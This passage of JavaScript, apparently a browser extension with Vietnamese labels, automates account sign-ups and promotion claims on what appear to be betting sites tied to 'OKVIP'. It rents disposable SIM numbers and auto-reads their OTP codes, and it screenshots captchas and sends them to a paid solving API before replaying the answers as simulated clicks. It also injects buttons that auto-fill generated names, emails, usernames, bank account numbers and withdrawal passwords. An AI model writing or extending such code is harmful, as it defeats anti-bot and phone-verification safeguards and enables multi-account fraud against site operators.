               KW.test(el.getAttribute("aria-label")||"");
      }) || null;
  }

  const stripZero = p => p.startsWith("0") ? p.slice(1) : p;

  function fillInput(el, val) {
    if (!el) return false;
    el.focus(); el.select();
    try {
      const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value')?.set;
      if (setter) setter.call(el, val); else el.value = val;
    } catch(e) { el.value = val; }
    ['focus','input','change','blur'].forEach(ev =>
      el.dispatchEvent(new Event(ev, { bubbles: true, cancelable: true }))
    );
    el.dispatchEvent(new KeyboardEvent('keydown',  { bubbles: true, cancelable: true }));
    el.dispatchEvent(new KeyboardEvent('keypress', { bubbles: true, cancelable: true }));
    el.dispatchEvent(new KeyboardEvent('keyup',    { bubbles: true, cancelable: true }));
    return true;
  }

  const getStorage = keys => Promise.resolve(Object.fromEntries(keys.map(k => [k, localStorage.getItem(k)])));
  const setStorage = obj => { Object.entries(obj).forEach(([k,v]) => localStorage.setItem(k, v)); return Promise.resolve(); };

  function detectType(key) {
    if (!key) return null;
    if (key.startsWith("eyJ") && key.split(".").length === 3) return "okvip";
    if (/^[a-f0-9]{32}$/i.test(key)) return "sv2";
    return null;
  }

  async function callOkvip(path) { return (await fetch(WORKER + path)).json(); }
  async function callSv2(apiKey, params) { return (await fetch(SV2_BASE + "?" + new URLSearchParams({apik: apiKey, ...params}))).json(); }

  async function cancelSim(sim, apiKey) {
    try {
      if (sim.source === "okvip") await callOkvip(`/cancel?api_key=${apiKey}&sim_id=${sim.simId}`);
      else await callSv2(apiKey, {act:"expired", id:sim.otpId});
    } catch(e) {}
  }

  async function rentNewSim(apiKey, type) {
    showToast("⏳ Đang thuê SIM...", "info");
    for (let i = 0; i < 3; i++) {
      try {
        if (type === "okvip") {
          const d = await callOkvip(`/get-sim?api_key=${apiKey}&service_id=${FIXED_SVC}`);
          if (d?.status !== 200) continue;
          return { phone: d.data.phone, simObj: { source:"okvip", otpId:d.data.otpId, simId:d.data.simId, phone:d.data.phone, code:null, done:false } };
        } else {
          const d = await callSv2(apiKey, {act:"number", appId:APP_ID});
          if (d?.ResponseCode !== 0) continue;
          const phone = "0" + d.Result.Number;
          return { phone, simObj: { source:"sv2", otpId:d.Result.Id, simId:d.Result.Id, phone, code:null, done:false } };
        }
      } catch(e) {}
      await new Promise(r => setTimeout(r, 1500));
    }
    showToast("❌ Kho số tạm hết", "error");
    return null;
  }

  async function pollOtp(sim, apiKey, btn) {
    const maxTry = 30; let count = 0;
    return new Promise(resolve => {
      const timer = setInterval(async () => {
        count++;
        if (count > maxTry) {
          clearInterval(timer);
          btn.textContent = "⏰ Hết giờ"; btn.style.background = "#dc3545";
          resolve(null); return;
        }
        try {
          let code = null;
          if (sim.source === "okvip") {
            const d = await callOkvip(`/get-otp?api_key=${apiKey}&otp_id=${sim.otpId}`);
            const m = (d?.data?.content||"").match(/\b\d{4,8}\b/);
            if (m) code = m[0];
          } else {
            const d = await callSv2(apiKey, {act:"code", id:sim.otpId});
            if (d?.ResponseCode === 0 && d?.Result?.Code) code = d.Result.Code;
          }
          if (code) {
            clearInterval(timer);
            btn.textContent = `✅ OTP ${code}`; btn.style.background = "#28a745";
            fillInput(findOtpInput(), code);
            sim.code = code; sim.done = true;
            setStorage({[CURRENT_SIM_KEY]: JSON.stringify(sim)});
            resolve(code);
          }
        } catch(e) {}
      }, 4000);
    });
  }

  function needsLeadingZero(el) {
    if (!el) return false;
    return el.name === "mobileNum1" || el.classList.contains("form-mobileNum");
  }

  function doFillPhone(phone) {
    const phoneEl = findPhoneInput();
    if (!phoneEl) return;
    const keepZero = needsLeadingZero(phoneEl);
    const val = keepZero ? phone : stripZero(phone);
    fillInput(phoneEl, val);
    setTimeout(async () => {
      if (!phoneEl.value) await typeIntoInput(phoneEl, val);
      setTimeout(async () => {
        if (!phoneEl.value) await typeIntoInput(phoneEl, phone);
      }, 500);
    }, 300);
  }

  async function handleFillPhoneClick() {
    const hardPhone = await getHardPhone();
    if (hardPhone) {
      const phoneEl = findPhoneInput();
      if (phoneEl) {
        await typeIntoInput(phoneEl, hardPhone);
        try { chrome.storage.local.set({[LAST_PHONE_KEY]: hardPhone}); } catch(e) {}
        showToast("📱 SĐT cứng: " + hardPhone, "success");
      } else {
        showToast("❌ Không tìm thấy ô SĐT", "error");
      }
      return;
    }

    const { [API_KEY_STORE]:apiKey, [CURRENT_SIM_KEY]:currentRaw } = await getStorage([API_KEY_STORE, CURRENT_SIM_KEY]);
    const type = detectType(apiKey);
    if (!apiKey || !type) { showToast("❌ API key lỗi", "error"); return; }

    let currentSim = null;
    try { currentSim = JSON.parse(currentRaw || "null"); } catch(e) {}

    const phoneEl     = findPhoneInput();
    const isVerifyStep = /\d+\*\d+/.test(phoneEl?.placeholder || "");

    if (isVerifyStep) {
      if (currentSim?.phone) { showToast(`♻️ Dùng lại ${currentSim.phone}`, "info"); doFillPhone(currentSim.phone); }
      else showToast("❌ Chưa có SIM", "error");
      return;
    }

    if (phoneEl?.value) fillInput(phoneEl, "");
    if (currentSim) await cancelSim(currentSim, apiKey);

    const res = await rentNewSim(apiKey, type);
    if (!res) return;
    setStorage({[CURRENT_SIM_KEY]: JSON.stringify(res.simObj)});
    showToast(`✅ ${res.phone}`, "success");
    try { chrome.storage.local.set({[LAST_PHONE_KEY]: res.phone}); } catch(e) {}
    doFillPhone(res.phone);
  }

  async function handleOtpClick() {
    const { [CURRENT_SIM_KEY]:raw, [API_KEY_STORE]:apiKey } = await getStorage([CURRENT_SIM_KEY, API_KEY_STORE]);
    let sim = null;
    try { sim = JSON.parse(raw || "null"); } catch(e) {}
    if (!sim) { showToast("❌ Chưa có SIM", "error"); return; }
    const btn = document.querySelector('[data-mk-btn="okvip-btn-otp"]');
    btn.textContent = "⏳ Đang chờ"; btn.style.background = "#6c757d";
    await pollOtp(sim, apiKey, btn);
  }

  // =====================================================
  // ========== TOAST CHUNG ==========
  // =====================================================

  function showToast(msg, type) {
    document.getElementById("mk-toast-global")?.remove();
    const colors = { success:"#28a745", error:"#dc3545", info:"#007bff" };
    const t = document.createElement("div");
    t.id = "mk-toast-global";
    t.textContent = msg;
    t.style.cssText = `position:fixed;bottom:24px;left:50%;transform:translateX(-50%);z-index:99999;padding:10px 20px;border-radius:20px;font-size:13px;font-weight:bold;color:#fff;background:${colors[type]||"#333"};pointer-events:none;font-family:-apple-system,Arial,sans-serif;`;
    document.body.appendChild(t);
    setTimeout(() => t.remove(), 2500);
  }

  // =====================================================
  // ========== INJECT BUTTONS ==========
  // =====================================================

  function injectBankBtn(inputFn, btnId, wrapperId, label, color, onClick) {
    if (document.getElementById(btnId)) return;
    const input = inputFn();
    if (!input) return;
    if (isWithdrawInput(input)) return;
    if (input.parentNode?.id === wrapperId) return;

    const w = document.createElement("div");
    w.id = wrapperId;
    w.style.cssText = "position:relative;display:block;width:100%;";
    input.parentNode.insertBefore(w, input);
    w.appendChild(input);
    input.style.paddingRight = "110px";

    const btn = document.createElement("button");
    btn.id = btnId; btn.type = "button"; btn.innerHTML = label;
    Object.assign(btn.style, {
      position:"absolute", right:"4px", top:"50%", transform:"translateY(-50%)",
      background: color || "#f60", color:"#fff", border:"none", borderRadius:"6px",
      padding:"6px 10px", cursor:"pointer", fontWeight:"700", fontSize:"12px",
      zIndex:"9999", whiteSpace:"nowrap", touchAction:"manipulation"
    });
    btn.addEventListener("mousedown", e => e.preventDefault());
    btn.addEventListener("click", () => onClick(btn));
    w.appendChild(btn);
  }

  function injectSimBtn(inputEl, id, label, color, handler) {
    if (!inputEl) return;
    const parent = inputEl.parentElement;
    if (!parent) return;
    if (parent.querySelector(`[data-mk-btn="${id}"]`)) return;
    document.querySelectorAll(`[data-mk-btn="${id}"]`).forEach(b => b.remove());
    if (getComputedStyle(parent).position === "static") parent.style.position = "relative";
    const btn = document.createElement("button");
    btn.type = "button"; btn.textContent = label;
    btn.setAttribute('data-mk-btn', id);
    btn.style.cssText = `position:absolute;right:8px;top:50%;transform:translateY(-50%);z-index:9999;padding:4px 10px;background:${color};color:#fff;border:none;border-radius:6px;font-size:12px;font-weight:bold;cursor:pointer;touch-action:manipulation;`;
    btn.onclick = handler;
    parent.appendChild(btn);
  }

  // =====================================================
  // LOAD HTML2CANVAS
  // =====================================================

  function loadHtml2Canvas(){
    return new Promise((resolve, reject) => {
      if(window.html2canvas){ resolve(window.html2canvas); return; }
      const s = document.createElement('script');
      s.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
      s.onload  = () => resolve(window.html2canvas);
      s.onerror = () => reject(new Error('html2canvas load failed'));
      document.head.appendChild(s);
    });
  }

  function findBotionContainer(){
    const tipEl =
      document.querySelector('[class*="botion_text_tips"]') ||
      document.querySelector('[class*="botion"]') ||
      [...document.querySelectorAll('*')].find(el =>
        el.childNodes && [...el.childNodes].some(n =>
          n.textContent?.trim().includes('Chọn theo thứ tự')
        )
      );
    if(!tipEl) return null;
    let el = tipEl;
    for(let i = 0; i < 8; i++){
      if(!el.parentElement) break;
      el = el.parentElement;
      if(el.offsetWidth > 200 && el.offsetHeight > 200) return el;
    }
    return tipEl.parentElement || tipEl;
  }

  function findBotionImage(){
    const container = findBotionContainer();
    if(!container) return null;
    const canvas = container.querySelector('canvas');
    if(canvas && canvas.width > 50) return canvas;
    const imgs = [...container.querySelectorAll('img')]
      .sort((a,b) => (b.offsetWidth*b.offsetHeight)-(a.offsetWidth*a.offsetHeight));
    if(imgs.length) return imgs[0];
    return null;
  }

  function findBotionClickArea(){
    const container = findBotionContainer();
    if(!container) return null;
    const imgArea =
      container.querySelector('[class*="botion_img"]') ||
      container.querySelector('[class*="botion_body"]') ||
      container.querySelector('[class*="botion_click"]') ||
      container.querySelector('canvas') ||
      container.querySelector('img');
    return imgArea || container;
  }

  async function fetchImageBase64(src){
    try{
      const resp = await fetch(src, {mode:'cors'});
      const blob = await resp.blob();
      return new Promise(resolve => {
        const r = new FileReader();
        r.onloadend = () => resolve(r.result.split(',')[1]);
        r.onerror   = () => resolve(null);
        r.readAsDataURL(blob);
      });
    }catch(e){ return null; }
  }

  async function captureElement(el){
    try{
      const h2c = await loadHtml2Canvas();
      const canvas = await h2c(el, {
        useCORS: true, allowTaint: true, scale: 1,
        foreignObjectRendering: false,
      });
      return canvas.toDataURL('image/png').split(',')[1];
    }catch(e){ return null; }
  }

  async function getBase64ForCaptcha(){
    const botionImg = findBotionImage();
    if(botionImg){
      if(botionImg.tagName === 'CANVAS'){
        try{
          const b64 = botionImg.toDataURL('image/png').split(',')[1];
          if(b64 && b64.length > 100) return b64;
        }catch(e){}
      }
      if(botionImg.tagName === 'IMG' && botionImg.src){
        const b64 = await fetchImageBase64(botionImg.src);
        if(b64) return b64;
      }
    }
    const canvases = [...document.querySelectorAll('canvas')]
      .filter(c => c.width > 100 && c.offsetParent)
      .sort((a,b) => (b.width*b.height)-(a.width*a.height));
    if(canvases.length){
      try{
        const b64 = canvases[0].toDataURL('image/png').split(',')[1];
        if(b64 && b64.length > 100) return b64;
      }catch(e){}
    }
    const container = findBotionContainer();
    if(container){
      const b64 = await captureElement(container);
      if(b64) return b64;
    }
    try{
      const h2c = await loadHtml2Canvas();
      const myBtns = [...document.querySelectorAll('[id^="okvip-"]')];
      myBtns.forEach(b => b.style.visibility = 'hidden');
      const canvas = await h2c(document.body, {
        useCORS: true, allowTaint: true, scale: 1,
        x: window.scrollX, y: window.scrollY,
        width: window.innerWidth, height: window.innerHeight,
      });
      myBtns.forEach(b => b.style.visibility = '');
      return canvas.toDataURL('image/png').split(',')[1];
    }catch(e){
      document.querySelectorAll('[id^="okvip-"]').forEach(b => b.style.visibility = '');
      return null;
    }
  }

  async function solveCaptcha(base64, type){
    const apiKey = localStorage.getItem(CAPTCHA_KEY_STORE) || "";
    const resp = await fetch(ANTICAPTCHA_API, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ apikey: apiKey, img: base64, type })
    });
    return resp.json();
  }

  async function executeSolution(captchaText){
    if(!captchaText) return false;
    const text = captchaText.trim();
    const coords = [];
    const re = /(\d+)\s*,\s*(\d+)/g;
    let m;
    while((m = re.exec(text)) !== null) coords.push({x:+m[1], y:+m[2]});
    if(coords.length > 0){
      showToast(`🎯 Click ${coords.length} điểm...`, 'info');
      const clickArea = findBotionClickArea();
      const rect = clickArea ? clickArea.getBoundingClientRect() : {left:0, top:0};
      for(const {x, y} of coords){
        const areaW = clickArea?.offsetWidth || window.innerWidth;
        const areaH = clickArea?.offsetHeight || window.innerHeight;
        let absX, absY;
        if(x < areaW && y < areaH){
          absX = rect.left + x;
          absY = rect.top  + y;
        }else{
          absX = x; absY = y;
        }
        const el = document.elementFromPoint(absX, absY) || document.body;
        ['mousedown','mouseup','click'].forEach(ev =>
          el.dispatchEvent(new MouseEvent(ev, {bubbles:true, clientX:absX, clientY:absY}))
        );
        await new Promise(r => setTimeout(r, 700));
      }
      return true;
    }
    const inp = findOtpInput();
    if(inp){ fillInput(inp, text); return true; }
    showToast(`📋 Kết quả: ${text}`, 'info');
    return false;
  }

  async function handleSolveCaptcha(){
    const btn = document.querySelector('[data-mk-btn="okvip-btn-captcha"]');
    if(btn){ btn.textContent = '⏳ Xử lý...'; btn.disabled = true; btn.style.background = '#6c757d'; }
    try{
      showToast('📸 Chụp ảnh captcha...', 'info');
      const base64 = await getBase64ForCaptcha();
      if(!base64){
        showToast('❌ Không chụp được ảnh', 'error');
        resetCaptchaBtn(); return;
      }
      showToast('🤖 Đang gửi giải...', 'info');
      let result = await solveCaptcha(base64, 51);
      if(!result?.success) result = await solveCaptcha(base64, 14);
      if(!result?.success){
        showToast(`❌ ${result?.message || 'Lỗi API'}`, 'error');
        resetCaptchaBtn(); return;
      }
      showToast(`✅ ${result.captcha}`, 'success');
      await executeSolution(result.captcha);
    }catch(e){
      showToast('❌ Lỗi: ' + e.message, 'error');
    }
    resetCaptchaBtn();
  }

  function resetCaptchaBtn(){
    const btn = document.querySelector('[data-mk-btn="okvip-btn-captcha"]');
    if(!btn) return;
    btn.textContent = '🔓 Giải';
    btn.style.background = '#8b5cf6';
    btn.disabled = false;
  }

  function injectCaptchaBtn(){
    const allCaptchaInputs = [...document.querySelectorAll('input')].filter(el =>
      /nhập.*captcha|captcha|xác minh|xac minh|verify/i.test(el.placeholder || '') ||
      ['captcha-input'].includes(el.id) ||
      ['checkCode','captcha','verifyCode'].includes(el.getAttribute('formcontrolname'))
    );

    for (const checkInput of allCaptchaInputs) {
      if (checkInput.dataset.mkCaptchaInjected) continue;
      if (checkInput.closest('[id^="__mk_captcha_wrap"]')) continue;
      checkInput.dataset.mkCaptchaInjected = '1';

      const btn = document.createElement('button');
      btn.type = 'button';
      btn.textContent = '🔓 Giải';

      const isWfull = checkInput.classList.contains('w-full');
      if (isWfull && !checkInput.closest('[id^="__mk_captcha_wrap"]')) {
        const wrapId = '__mk_captcha_wrap__' + Date.now();
        const wrap = document.createElement('div');
        wrap.id = wrapId;
        wrap.style.cssText = 'position:relative;display:block;width:100%;';
        checkInput.parentNode.insertBefore(wrap, checkInput);
        wrap.appendChild(checkInput);
        checkInput.style.setProperty('padding-left', '90px', 'important');
        checkInput.style.setProperty('padding-right', '8px', 'important');
        const svgContainer = wrap.parentElement?.querySelector('div.absolute');
        if (svgContainer) svgContainer.style.display = 'none';
        Object.assign(btn.style, {
          position:'absolute', top:'50%', transform:'translateY(-50%)', left:'6px',
          background:'linear-gradient(135deg,#8b5cf6,#6d28d9)', color:'#fff',
          border:'none', borderRadius:'20px', padding:'7px 14px',
          fontWeight:'bold', fontSize:'13px', cursor:'pointer',
          zIndex:'9999', whiteSpace:'nowrap', touchAction:'manipulation',
          boxShadow:'0 2px 8px rgba(109,40,217,0.4)'
        });
        btn.addEventListener('mousedown', e => e.preventDefault());
        wrap.appendChild(btn);
      } else {
        btn.style.cssText = `display:block;width:100%;margin-top:6px;padding:7px 0;background:#8b5cf6;color:#fff;border:none;border-radius:8px;font-size:13px;font-weight:bold;cursor:pointer;box-shadow:0 2px 8px rgba(139,92,246,0.4);z-index:9999;touch-action:manipulation;`;
        btn.addEventListener('mousedown', e => e.preventDefault());
        checkInput.insertAdjacentElement('afterend', btn);
      }

      btn.onclick = async () => {
        btn.textContent = '⏳...'; btn.disabled = true; btn.style.background = '#6c757d';
        window.__MK_CAPTCHA_SOLVING__ = true;
        try {
          showToast('📸 Đọc mã captcha...', 'info');
          let base64 = null;
          let svgEl = null, node2 = checkInput;
          for(let i = 0; i < 6; i++) { node2 = node2.parentElement; if(!node2) break; svgEl = node2.querySelector('svg'); if(svgEl) break; }
          if(svgEl) {
            try {
              const svgStr = new XMLSerializer().serializeToString(svgEl);
              const w = svgEl.getAttribute('width') || 150;
              const h = svgEl.getAttribute('height') || 50;
              base64 = await new Promise(res => {
                const img = new Image();
                img.onload = () => { const c = document.createElement('canvas'); c.width=w; c.height=h; const ctx=c.getContext('2d'); ctx.fillStyle='#fff'; ctx.fillRect(0,0,w,h); ctx.drawImage(img,0,0); res(c.toDataURL('image/png').split(',')[1]); };
                img.onerror = () => res(null);
                img.src = 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent(svgStr);
              });
            } catch(e) {}
          }
          if(!base64) {
            let captchaImg = null, node = checkInput;
            for(let i=0;i<5;i++) { node=node.parentElement; if(!node) break; const imgs=[...node.querySelectorAll('img')].filter(img=>img.src&&(img.src.startsWith('data:image')||img.src.includes('captcha')||img.src.includes('verify')||img.src.includes('code'))); if(imgs.length){captchaImg=imgs[0];break;} }
            const captchaImgEl = document.getElementById('captcha-image') || captchaImg;
            if(captchaImgEl) {
              try {
                // helpers inline
                function _b64ToUint8(b64) { const bin=atob(b64);const arr=new Uint8Array(bin.length);for(let i=0;i<bin.length;i++)arr[i]=bin.charCodeAt(i);return arr; }
                function _b64ToBlob(b64,mime){return new Blob([_b64ToUint8(b64)],{type:mime||'application/octet-stream'});}
                function _textToBlob(txt,mime){return new Blob([txt],{type:mime||'text/plain'});}
                function _extractDataUri(src){const m=src.match(/^data:([^;]+)(;charset=[^;]+)?(;base64)?,(.*)$/s);if(!m)return null;return{mime:m[1]||'',isBase64:!!m[3],data:m[4]||''};}
                function _objUrlToPng(url,w,h){return new Promise((resolve,reject)=>{const img=new Image();img.crossOrigin='anonymous';img.onload=()=>{try{const cw=w||img.naturalWidth||img.width||200;const ch=h||img.naturalHeight||img.height||80;const c=document.createElement('canvas');c.width=cw;c.height=ch;const ctx=c.getContext('2d');ctx.fillStyle='#ffffff';ctx.fillRect(0,0,cw,ch);ctx.drawImage(img,0,0,cw,ch);const b64=c.toDataURL('image/png').split(',')[1];resolve(b64);}catch(e){reject(e);}};img.onerror=e=>reject(new Error('img load error'));img.src=url;});}
                const src=captchaImgEl.src||captchaImgEl.getAttribute('src')||'';
                if(src){
                  if(src.startsWith('data:')){
                    const parsed=_extractDataUri(src);
                    if(parsed){
                      const{mime,isBase64,data}=parsed;
                      if(mime==='image/svg+xml'||mime==='image/svg'){
                        const svgText=isBase64?atob(data):decodeURIComponent(data);
                        const blob=_textToBlob(svgText,'image/svg+xml;charset=utf-8');
                        const url=URL.createObjectURL(blob);
                        try{base64=await _objUrlToPng(url);}finally{URL.revokeObjectURL(url);}
                      }else{
                        const blob=_b64ToBlob(data,mime||'image/png');
                        const url=URL.createObjectURL(blob);
                        try{base64=await _objUrlToPng(url);}finally{URL.revokeObjectURL(url);}
                      }
                    }
                  }else{
                    const resp=await fetch(src,{mode:'cors'});
                    const mime=resp.headers.get('content-type')||'';
                    const ab=await resp.arrayBuffer();
                    const b64=btoa(String.fromCharCode(...new Uint8Array(ab)));
                    if(mime.includes('svg')){
                      const svgText=atob(b64);
                      const blob=_textToBlob(svgText,'image/svg+xml;charset=utf-8');
                      const url=URL.createObjectURL(blob);
                      try{base64=await _objUrlToPng(url);}finally{URL.revokeObjectURL(url);}
                    }else{
                      const blob=_b64ToBlob(b64,mime||'image/png');
                      const url=URL.createObjectURL(blob);
                      try{base64=await _objUrlToPng(url);}finally{URL.revokeObjectURL(url);}
                    }
                  }
                }
              } catch(e){}
            }
          }
          if(!base64) base64 = await getBase64ForCaptcha();
          if(!base64) { showToast('❌ Không chụp được ảnh','error'); window.__MK_CAPTCHA_SOLVING__=false; btn.textContent='🔓 Giải'; btn.style.background='#8b5cf6'; btn.disabled=false; return; }
          showToast('🤖 Đang nhận dạng...','info');
          let result = await solveCaptcha(base64, 1);
          if(!result?.success) result = await solveCaptcha(base64, 14);
          if(!result?.success) { showToast('❌ '+(result?.message||'Lỗi'),'error'); window.__MK_CAPTCHA_SOLVING__=false; btn.textContent='🔓 Giải'; btn.style.background='#8b5cf6'; btn.disabled=false; return; }
          showToast('✅ '+result.captcha,'success');
          const _val = result.captcha.trim();
          const _setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value')?.set;
          if(_setter) _setter.call(checkInput,_val); else checkInput.value=_val;
          checkInput.dispatchEvent(new Event('input',{bubbles:true}));
        } catch(e) { showToast('❌ '+e.message,'error'); }
        btn.textContent='🔓 Giải'; btn.style.background='#8b5cf6'; btn.disabled=false;
        setTimeout(()=>{window.__MK_CAPTCHA_SOLVING__=false;},3000);
      };
    }
  }

  // ========== NÚT ĐIỀN TKKM ==========
  function injectTKKMBtn() {
    if(document.getElementById('okvip-btn-tkkm')) return;

    let targetInput = null;

    const byIdAccount = document.querySelector('input[type="text"]#account.background-input-select');
    if(byIdAccount) { targetInput = byIdAccount; }

    if(!targetInput) {
      const byId = document.getElementById('account');
      if(byId && byId.tagName === 'INPUT') targetInput = byId;
    }

    if(!targetInput) {
      const byAC = [...document.querySelectorAll('input[autocomplete="username"]')].find(el =>
        el.offsetParent !== null && el.offsetWidth > 0
      );
      if(byAC) targetInput = byAC;
    }

    if(!targetInput) {
      targetInput = [...document.querySelectorAll('input[type="text"], input:not([type])')].find(el =>
        /tên tài khoản|ten tai khoan|tên tk|tài khoản/i.test(el.placeholder || "") &&
        el.offsetParent !== null &&
        el.offsetWidth > 0 &&
        el.offsetHeight > 0 &&
        el.getAttribute("data-input-name") !== "account" &&
        el.getAttribute("data-input-name") !== "username" &&
        el.getAttribute("name") !== "username" &&
        el.getAttribute("formcontrolname") !== "account"
      ) || null;
    }

    if(!targetInput) {
      const allTitleDivs = [...document.querySelectorAll('div.title-form')];
      const promoTitle = allTitleDivs.find(el =>
        el.textContent.trim().includes('Thông tin khuyến mãi')
      );
      if(!promoTitle) return;
      const container = promoTitle.closest('form, [class*="form"], div[class*="box"], div[class*="wrap"], section') || promoTitle.parentElement?.parentElement;
      let accountTitle = null;
      if(container) {
        accountTitle = [...container.querySelectorAll('div.title-form')].find(el =>
          el.textContent.trim().includes('Tên tài khoản')
        );
      }
      if(!accountTitle) {
        accountTitle = allTitleDivs.find(el => el.textContent.trim().includes('Tên tài khoản'));
      }
      if(!accountTitle) return;
      const inputContainer = accountTitle.closest('div') || accountTitle.parentElement;
      targetInput = inputContainer?.querySelector('input[type="text"], input') ||
        accountTitle.nextElementSibling?.querySelector('input') ||
        accountTitle.parentElement?.querySelector('input');
    }

    if(!targetInput) return;

    const btn = document.createElement('button');
    btn.id = 'okvip-btn-tkkm';
    btn.type = 'button';
    btn.textContent = '🆔 Điền TKKM';

    const alreadyWrapped = targetInput.closest('#__mk_tkkm_wrap__');
    if (!alreadyWrapped) {
      const wrap = document.createElement('div');
      wrap.id = '__mk_tkkm_wrap__';
      wrap.style.cssText = 'position:relative;display:block;width:100%;';
      targetInput.parentNode.insertBefore(wrap, targetInput);
      wrap.appendChild(targetInput);
      let _node = wrap.parentElement;
      for(let _i = 0; _i < 6; _i++) {
        if(!_node) break;
        const _cs = getComputedStyle(_node);
        if(_cs.overflow === 'hidden' || _cs.overflow === 'clip') _node.style.overflow = 'visible';
        if(_cs.overflowY === 'hidden') _node.style.overflowY = 'visible';
        _node = _node.parentElement;
      }
    }

    targetInput.style.setProperty('padding-right', '130px', 'important');
    btn.style.cssText = 'position:absolute;right:4px;top:50%;transform:translateY(-50%);' +
      'background:#1a73e8;color:#fff;border:none;border-radius:6px;' +
      'padding:6px 10px;cursor:pointer;font-weight:700;font-size:12px;' +
      'z-index:2147483640;white-space:nowrap;touch-action:manipulation;';

    btn.addEventListener('mousedown', e => e.preventDefault());
    btn.onclick = async () => {
      let savedNick = '';
      try { savedNick = localStorage.getItem('okvip_hard_username') || ''; } catch(e) {}
      if (!savedNick) {
        try {
          const res = await new Promise(resolve => chrome.storage.local.get(['okvip_hard_username'], resolve));
          savedNick = res['okvip_hard_username'] || '';
        } catch(e) {}
      }
      if (!savedNick) { try { savedNick = window.__OKVIP_okvip_last_username__ || ''; } catch(e) {} }
      if (!savedNick) {
        try {
          const res = await new Promise(resolve => chrome.storage.local.get(['okvip_last_username'], resolve));
          savedNick = res['okvip_last_username'] || '';
        } catch(e) {}
      }
      if (!savedNick) savedNick = localStorage.getItem(LAST_USERNAME_KEY) || '';
      // Nếu vẫn không có → fetch từ Firestore (cross-domain từ trang ĐK thường)
      if (!savedNick) {
        btn.textContent = '⏳ Đang lấy TK...';
        savedNick = await loadUsernameFromFirestore();
      }
      if(!savedNick) { showToast('⚠️ Chưa có TK nào được lưu', 'error'); btn.textContent = '🆔 Điền TKKM'; return; }
      btn.textContent = '⌨️...'; btn.disabled = true;
      await typeIntoInput(targetInput, savedNick);
      btn.textContent = `✅ ${savedNick}`; btn.style.background = '#2e7d32';
      showToast('🆔 TKKM: ' + savedNick, 'success');
      setTimeout(() => { btn.textContent = '🆔 Điền TKKM'; btn.style.background = '#1a73e8'; btn.disabled = false; }, 2000);
    };

    const wrapEl = targetInput.closest('#__mk_tkkm_wrap__') || targetInput.parentElement;
    wrapEl.appendChild(btn);
  }

  function tryInjectAll() {
    injectBankBtn(getPasswordInput, "__mk_fill_btn__", "__mk_wrapper__", "🔑 Điền MK", "#f60", async (btn) => {
      const t = getPasswordInput();
      if (!t) return;
      btn.textContent = "⌨️..."; btn.disabled = true;
      await typeIntoInput(t, getPassword());
      btn.textContent = "✅ Xong"; btn.style.background = "#2e7d32";
      setTimeout(() => { btn.innerHTML = "🔑 Điền MK"; btn.style.background = "#f60"; btn.disabled = false; }, 1500);
    });

    (function injectWithdrawPw() {
      const wdInputs = getWithdrawInputs();
      wdInputs.forEach((el, idx) => {
        const btnId = `__mk_wdpw_btn_${idx}__`;
        if (document.getElementById(btnId)) return;
        if (el.closest(`#__mk_wdpw_wrap_${idx}__`)) return;
        const parent = el.parentElement;
        if (!parent) return;
        if (getComputedStyle(parent).position === "static") parent.style.position = "relative";
        el.style.paddingRight = "110px";
        el.style.boxSizing = "border-box";
        const btn = document.createElement("button");
        btn.id = btnId;
        btn.type = "button";
        btn.innerHTML = "🔒 MK Rút";
        btn.style.cssText = "position:absolute;right:36px;top:50%;transform:translateY(-50%);background:#e91e63;color:#fff;border:none;border-radius:6px;padding:5px 8px;cursor:pointer;font-weight:700;font-size:11px;z-index:9999;white-space:nowrap;touch-action:manipulation;";
        btn.addEventListener("mousedown", e => e.preventDefault());
        btn.addEventListener("click", async () => {
          btn.textContent = "⌨️..."; btn.disabled = true;
          clickEyeIcon(el);
          await sleep(150);
          await typeIntoInput(el, getWithdrawPassword());
          btn.textContent = "✅"; btn.style.background = "#2e7d32";
          setTimeout(() => { btn.innerHTML = "🔒 MK Rút"; btn.style.background = "#e91e63"; btn.disabled = false; }, 1500);
        });
        parent.appendChild(btn);
      });
    })();

    injectBankBtn(getNameInput, "__mk_name_btn__", "__mk_name_wrapper__", "👤 Điền Tên", "#f60", async (btn) => {
      await showPicker(async (account) => {
        setLastAccount(account);
        btn.textContent = "⌨️..."; btn.disabled = true;

        await typeIntoInput(getNameInput(), account.name);
        try { chrome.storage.local.set({[LAST_NAME_KEY]: account.name}); } catch(e) {}

        await sleep(200);
        const emailEl2 = getEmailInput();
        if (emailEl2) {
          const emailOpts = genEmailOptions(account.name);
          const emailPick = emailOpts[Math.floor(Math.random() * emailOpts.length)];
          await typeIntoInput(emailEl2, emailPick.value);
        }

        await sleep(200);
        let hardUser3 = "";
        try { hardUser3 = localStorage.getItem("okvip_hard_username") || ""; } catch(e) {}
        if (!hardUser3) { try { hardUser3 = await new Promise(res => chrome.storage.local.get(["okvip_hard_username"], s => res(s["okvip_hard_username"] || ""))); } catch(e) {} }
        const userEl = getUsernameInput();
        if (userEl) {
          let fillVal;
          if (hardUser3) {
            fillVal = hardUser3;
          } else {
            const opts = genNickOptions(account.name);
            fillVal = opts[Math.floor(Math.random() * opts.length)].value;
          }
          await typeIntoInput(userEl, fillVal);
          try { chrome.storage.local.set({[LAST_USERNAME_KEY]: fillVal}); } catch(e) {}
          showToast((hardUser3 ? "🆔 TK: " : "🎲 TK: ") + fillVal, "info");
          const confirmEl = getConfirmUsernameInput();
          if (confirmEl) await typeIntoInput(confirmEl, fillVal);
        } else {
          const fallbackEl = document.querySelector('input[data-input-name="account"]');
          if (fallbackEl) {
            let fillVal;
            if (hardUser3) {
              fillVal = hardUser3;
            } else {
              const opts = genNickOptions(account.name);
              fillVal = opts[Math.floor(Math.random() * opts.length)].value;
            }
            fallbackEl.focus();
            const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
            setter.call(fallbackEl, fillVal);
            ['input','change'].forEach(ev => fallbackEl.dispatchEvent(new Event(ev, {bubbles:true})));
            showToast((hardUser3 ? "🆔 TK: " : "🎲 TK: ") + fillVal, "info");
          }
        }

        await sleep(200);
        const stkEl2 = getStkInput();
        if (stkEl2) {
          await typeIntoInput(stkEl2, account.account);
          showToast("💳 STK: " + account.account, "info");
        }

        await sleep(300);
